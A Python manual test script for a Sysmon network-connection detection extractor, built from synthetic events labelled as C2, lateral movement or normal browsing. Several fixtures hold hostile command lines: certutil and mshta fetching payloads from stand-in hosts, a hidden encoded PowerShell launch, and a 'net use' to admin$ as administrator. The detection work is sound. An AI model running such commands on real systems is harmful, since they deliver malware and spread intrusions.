"""
Manual test for Sysmon Event ID 3 (Network Connection) extractor.
Run: python test_sysmon3_manual.py
"""
import sys
sys.path.insert(0, ".")
from dfs_core.features.windows_sysmon_3 import extract

CASES = {
    "certutil.exe → external IP:443 (LOLBin C2)": {
        "host": {"name": "WS-0231"},
        "user": {"name": "jdoe"},
        "process": {
            "executable": r"C:\Windows\System32\certutil.exe",
            "pid": 4512,
            "command_line": "certutil.exe -urlcache -split -f http://198.51.100.42/payload.exe",
            "parent": {"executable": r"C:\Windows\System32\cmd.exe"},
        },
        "destination": {"ip": "198.51.100.42", "port": 80, "domain": "198.51.100.42"},
        "source": {"ip": "10.0.1.55", "port": 49812},
        "network": {"protocol": "tcp"},
        "winlog": {"event_data": {"ProcessGuid": "{abc-123}", "Initiated": "true"}},
        "@timestamp": "2024-01-15T10:30:00Z",
    },

    "winword.exe → external IP:4444 (Office macro C2)": {
        "host": {"name": "WS-0991"},
        "user": {"name": "alice"},
        "process": {
            "executable": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "pid": 6200,
            "parent": {"executable": r"C:\Windows\explorer.exe"},
        },
        "destination": {"ip": "185.220.101.10", "port": 4444},
        "source": {"ip": "10.0.2.10", "port": 51234},
        "network": {"protocol": "tcp"},
        "winlog": {"event_data": {"ProcessGuid": "{def-456}", "Initiated": "true"}},
        "@timestamp": "2024-01-15T10:31:00Z",
    },

    "svchost.exe → external IP (unusual system process)": {
        "host": {"name": "DC-01"},
        "user": {"name": "SYSTEM"},
        "process": {
            "executable": r"C:\Windows\System32\svchost.exe",
            "pid": 980,
            "command_line": r"C:\Windows\System32\svchost.exe -k netsvcs",
            "parent": {"executable": r"C:\Windows\System32\services.exe"},
        },
        "destination": {"ip": "203.0.113.99", "port": 8080, "domain": "suspicious.example.com"},
        "source": {"ip": "10.0.0.5", "port": 50001},
        "network": {"protocol": "tcp"},
        "winlog": {"event_data": {"ProcessGuid": "{ghi-789}", "Initiated": "true"}},
        "@timestamp": "2024-01-15T10:32:00Z",
    },

    "powershell.exe → DGA domain (C2 beaconing)": {
        "host": {"name": "WS-0551"},
        "user": {"name": "bob"},
        "process": {
            "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "pid": 3344,
            "command_line": "powershell.exe -NoProfile -W Hidden -Enc SQBFAF...",
            "parent": {"executable": r"C:\Windows\System32\wscript.exe"},
        },
        "destination": {"ip": "91.234.55.12", "port": 443, "domain": "xvzpqkrtmnbdfl.com"},
        "source": {"ip": "10.0.3.20", "port": 52100},
        "network": {"protocol": "tcp"},
        "winlog": {"event_data": {"ProcessGuid": "{jkl-012}", "Initiated": "true"}},
        "@timestamp": "2024-01-15T10:33:00Z",
    },

    "Lateral movement: cmd.exe → SMB internal": {
        "host": {"name": "WS-0123"},
        "user": {"name": "jdoe"},
        "process": {
            "executable": r"C:\Windows\System32\cmd.exe",
            "pid": 7788,
            "command_line": r"cmd.exe /c net use \\10.0.1.20\admin$ /user:CORP\administrator",
            "parent": {"executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"},
        },
        "destination": {"ip": "10.0.1.20", "port": 445},
        "source": {"ip": "10.0.1.55", "port": 49900},
        "network": {"protocol": "tcp"},
        "winlog": {"event_data": {"ProcessGuid": "{mno-345}", "Initiated": "true"}},
        "@timestamp": "2024-01-15T10:34:00Z",
    },

    "chrome.exe → HTTPS (normal browsing)": {
        "host": {"name": "WS-0771"},
        "user": {"name": "charlie"},
        "process": {
            "executable": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "pid": 5500,
            "parent": {"executable": r"C:\Windows\explorer.exe"},
        },
        "destination": {"ip": "142.250.80.46", "port": 443, "domain": "www.google.com"},
        "source": {"ip": "10.0.4.30", "port": 53210},
        "network": {"protocol": "tcp"},
        "winlog": {"event_data": {"ProcessGuid": "{pqr-678}", "Initiated": "true"}},
        "@timestamp": "2024-01-15T10:35:00Z",
    },

    "mshta.exe → port 31337 (LOLBin + C2 port)": {
        "host": {"name": "WS-0881"},
        "user": {"name": "eve"},
        "process": {
            "executable": r"C:\Windows\System32\mshta.exe",
            "pid": 2233,
            "command_line": "mshta.exe http://evil.example.com/payload.hta",
            "parent": {"executable": r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"},
        },
        "destination": {"ip": "185.100.87.202", "port": 31337},
        "source": {"ip": "10.0.5.10", "port": 49555},
        "network": {"protocol": "tcp"},
        "winlog": {"event_data": {"ProcessGuid": "{stu-901}", "Initiated": "true"}},
        "@timestamp": "2024-01-15T10:36:00Z",
    },
}

print(f"\n{'='*76}")
print(f"{'CASE':<44} {'S':>6} {'T':>6} {'B':>6} {'DFS':>7}")
print(f"{'='*76}")

for name, event in CASES.items():
    inputs, flags = extract(event)
    dfs = round(inputs.signal * inputs.trust * inputs.overlap, 4)
    print(f"{name:<44} {inputs.signal:>6.3f} {inputs.trust:>6.3f} {inputs.overlap:>6.3f} {dfs:>7.4f}")
    risk_flags = [k for k, v in flags.items() if v is True and (
        k.startswith("is_") or k.startswith("has_dst")
    )]
    if risk_flags:
        print(f"  flags: {', '.join(risk_flags[:6])}")

print(f"{'='*76}\n")
